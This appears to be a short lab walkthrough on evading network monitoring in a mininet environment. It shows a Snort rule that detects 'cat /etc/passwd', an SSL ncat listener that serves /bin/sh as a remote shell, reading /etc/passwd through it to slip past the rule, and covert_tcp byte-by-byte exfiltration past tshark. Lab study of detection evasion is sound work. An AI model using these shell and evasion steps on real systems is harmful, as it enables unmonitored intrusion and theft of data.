# Evading Snort Rule
## Startup mininet
```
sudo mn
```
## Edit snort rules
```
sudo nano /etc/snort/rules/local.rules
```
```
alert tcp any any -> $HOME_NET any (msg:"System file access"; content:"cat /etc/passwd"; sid:1000003;)
```
## Start snort with new rule
```
mininet/util/m h1 snort -A console -c /etc/snort/snort.conf1 -i h1-eth0
```
## Start Encrypted SSL Listener
```
h1 ncat --ssl -l -p 999 -e /bin/sh &
```
## Connect to netcat listener
```
h2 ncat --ssl h1 999
```
## Exfil data that would trigger snort rule in plaintext
```
cat /etc/passwd
```
# Evading Tshark monitoring
## Start Tshark
```
sudo tshark -i lo -V port 10000 | grep secret
```
## Start ncat listener
```
sudo ncat -l -p 10000
```
## Send message via ncat
```
ncat skillsetlocal.com 10000
secret message
```
message was captured on TShark

# Send message with covert tcp tool sending one byte at a time
## Setup temp folder
```
mkdir /tmp/receive
```

## Start the covert listener
```
sudo ./covert_tcp -dest localhost -source localhost -source_port 10000 -dest_port 20000 -server -file /tmp/receive/file.txt
```

## create tmp/send folder
```
mkdir /tmp/send
```

## Create message
```
cat > /tmp/send/file.txt
secret message
```

## Send the message
```
sudo ./covert_tcp -dest localhost -source localhost --source_port 20000 -dest_port 10000 -file /tmp/send/file.txt
```